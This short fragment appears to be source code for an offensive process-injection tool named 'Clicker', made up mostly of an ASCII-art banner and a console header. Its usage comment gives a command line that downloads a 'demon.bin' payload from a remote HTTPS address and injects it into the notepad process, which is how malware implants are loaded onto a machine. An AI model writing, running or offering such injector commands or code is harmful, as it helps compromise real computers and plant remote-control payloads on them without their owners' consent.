...
// Clicker.exe -f "C:\Users\Wesley\Downloads\Clicker.exe" -p 21500 -u "https://192.168.231.128:9090/demon.bin" -t notepad -s 21500
  ...
  `:. `:.             .             .:'  .:'
   `::. `::           !           ::' .::'
       ...
       `::      `T: `. .' :T'      ::'
        ...
        {
            Console.WriteLine("Process Injector 3 (Wrapper): Clicker (Process Mitigation Policy)");
            Console.WriteLine("");
